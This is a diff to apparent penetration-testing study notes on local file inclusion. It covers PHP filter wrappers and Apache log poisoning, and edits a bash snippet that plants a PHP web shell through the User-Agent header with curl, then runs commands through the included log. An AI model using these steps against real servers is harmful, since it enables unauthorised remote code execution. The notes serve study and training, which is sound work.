@@ -11,7 +11,7 @@
 - [Log Poisoning](#log-poisoning)
 - [Server Log Poisoning](#server-log-poisoning)
 
-
+--------------------------------------------------------------------------------------------------------
 - **PHP Filters**
     - PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify.
     - To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with php://filter/.
@@ -268,7 +268,7 @@ http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
 - To do so, we will use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to Apache Log Poisoning
 - Observe whether our custom User-Agent value is visible in the included log file. If poisoned successfully,then we can poison the User-Agent header by setting it to a basic PHP web shell:
 ```bash
-echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+echo -n "User-Agent: <?php system($_GET['cmd']); ?>" > Poison
 curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
 ```
 - As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`&cmd=id`).
